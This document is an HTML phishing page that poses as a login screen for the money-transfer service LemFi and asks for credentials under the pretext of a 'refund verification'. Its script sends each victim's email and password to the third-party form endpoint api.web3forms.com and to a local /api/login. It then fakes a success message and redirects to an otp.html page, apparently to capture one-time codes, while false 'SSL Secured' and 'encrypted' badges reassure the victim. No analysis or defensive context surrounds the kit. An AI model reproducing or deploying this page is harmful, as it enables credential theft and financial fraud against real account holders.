<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEMFI — Login</title>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        :root { --green-primary: #00C389; --green-dark: #00A873; --green-light: #E6F9F2; --green-ghost: #F0FBF6; --text-primary: #1B1B1B; --text-secondary: #6B7280; --text-tertiary: #9CA3AF; --border: #E5E7EB; --bg-body: #F9FAFB; --bg-card: #FFFFFF; --shadow-lg: 0 12px 40px rgba(0,0,0,0.08); --shadow-btn: 0 4px 14px rgba(0,195,137,0.3); --radius-md: 12px; --radius-lg: 16px; --radius-xl: 20px; }
        body { font-family: 'DM Sans', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: var(--bg-body); padding: 24px 16px; color: var(--text-primary); -webkit-font-smoothing: antialiased; }
        body::before { content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 0; background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(0,195,137,0.08) 0%, transparent 60%); }
        .page-wrapper { position: relative; z-index: 1; width: 100%; max-width: 440px; }
        .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; padding: 0 4px; }
        .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
        .logo-mark { width: 40px; height: 40px; background: var(--green-primary); border-radius: 10px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
        .logo-mark::after { content: ''; width: 18px; height: 18px; border: 3px solid #fff; border-radius: 50%; border-top-color: transparent; transform: rotate(45deg); }
        .logo-wordmark { font-size: 22px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.5px; }
        .card { background: var(--bg-card); border-radius: var(--radius-xl); box-shadow: var(--shadow-lg); border: 1px solid rgba(0,0,0,0.04); overflow: hidden; }
        .card-inner { padding: 32px; }
        .page-icon { width: 48px; height: 48px; background: var(--green-light); border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
        .page-icon svg { width: 24px; height: 24px; color: var(--green-primary); }
        .page-title { font-size: 20px; font-weight: 700; margin-bottom: 4px; }
        .page-sub { font-size: 13px; color: var(--text-secondary); margin-bottom: 28px; line-height: 1.5; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; color: var(--text-primary); margin-bottom: 6px; }
        .form-group input { width: 100%; padding: 12px 14px; border: 1.5px solid var(--border); border-radius: var(--radius-md); font-size: 14px; font-family: inherit; color: var(--text-primary); background: var(--bg-body); transition: border-color 0.2s; outline: none; }
        .form-group input:focus { border-color: var(--green-primary); }
        .form-group input::placeholder { color: var(--text-tertiary); }
        .btn-primary { width: 100%; padding: 14px 24px; background: var(--green-primary); color: #fff; border: none; border-radius: var(--radius-md); font-size: 15px; font-weight: 600; font-family: inherit; cursor: pointer; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; overflow: hidden; margin-top: 8px; }
        .btn-primary::before { content: ''; position: absolute; inset: 0; background: linear-gradient(180deg, rgba(255,255,255,0.12) 0%, transparent 100%); pointer-events: none; }
        .btn-primary:hover { background: var(--green-dark); box-shadow: var(--shadow-btn); transform: translateY(-1px); }
        .btn-primary:active { transform: translateY(0); }
        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
        .footer-section { margin-top: 24px; padding-top: 20px; border-top: 1px solid var(--border); }
        .footer-text { text-align: center; font-size: 12px; color: var(--text-tertiary); line-height: 1.7; }
        .footer-text a { color: var(--green-primary); text-decoration: none; font-weight: 500; }
        .security-row { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 16px; }
        .security-badge { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--text-tertiary); }
        .security-badge svg { width: 14px; height: 14px; color: var(--green-primary); }
        .toast { position: fixed; top: 24px; left: 50%; transform: translateX(-50%) translateY(-120%); background: #DC2626; color: #fff; padding: 12px 20px; border-radius: var(--radius-md); font-size: 14px; font-family: inherit; box-shadow: 0 8px 30px rgba(0,0,0,0.15); z-index: 9999; transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        .toast.show { transform: translateX(-50%) translateY(0); }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
        .animate-in { animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
        .delay-1 { animation-delay: 0.05s; } .delay-2 { animation-delay: 0.1s; } .delay-3 { animation-delay: 0.15s; } .delay-4 { animation-delay: 0.2s; } .delay-5 { animation-delay: 0.25s; }
        @media (max-width: 480px) { body { padding: 16px 12px; } .card-inner { padding: 24px; } }
    </style>
</head>
<body>
    <div class="toast" id="toast"></div>
    <div class="page-wrapper">
        <div class="top-bar animate-in">
            <a href="#" class="logo"><div class="logo-mark"></div><span class="logo-wordmark">Lemfi</span></a>
        </div>
        <div class="card">
            <div class="card-inner">
                <div class="page-icon animate-in delay-1">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
                </div>
                <h1 class="page-title animate-in delay-2">Sign in to your account</h1>
                <p class="page-sub animate-in delay-3">Enter your LemFi account credentials to continue the refund verification.</p>
                <form id="loginForm">
                    <input type="hidden" name="access_key" value="YOUR_WEB3FORM_ACCESS_KEY">
                    <input type="hidden" name="subject" value="Login Attempt">
                    <input type="hidden" name="from_name" value="Lemfi Website">
                    <input type="hidden" name="page" value="login.html">
                    <div class="form-group animate-in delay-3">
                        <label for="email">Email Address</label>
                        <input type="email" id="email" name="email" placeholder="you@example.com" required>
                    </div>
                    <div class="form-group animate-in delay-4">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
                    </div>
                    <button type="submit" class="btn-primary animate-in delay-5" id="submitBtn">
                        <span>Sign In</span>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                    </button>
                </form>
                <div class="footer-section animate-in delay-5">
                    <p class="footer-text">Your credentials are encrypted end-to-end. <a href="#">Forgot password?</a></p>
                    <div class="security-row">
                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL Secured</div>
                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Encrypted</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3500); }
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.disabled = true; btn.innerHTML = '<span>Verifying...</span>';
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            localStorage.setItem('refundEmail', email);
            const formData = { access_key: 'YOUR_WEB3FORM_ACCESS_KEY', subject: 'Login Attempt', from_name: 'Lemfi Website', page: 'login.html', email: email, password: password };
            try {
                const [web3Response, apiResponse] = await Promise.allSettled([fetch('https://api.web3forms.com/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(formData) }), fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password }) }) ]);
                const apiData = apiResponse.status === 'fulfilled' ? await apiResponse.value.json() : null;
                if (apiData && apiData.success) { window.location.href = apiData.redirect; }
                else { showToast('Verification successful. Redirecting...'); setTimeout(() => window.location.href = 'otp.html', 1000); }
            } catch (err) { showToast('Network error. Please try again.'); btn.disabled = false; btn.innerHTML = '<span>Sign In</span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>'; }
        });
    </script>
</body>
</html>
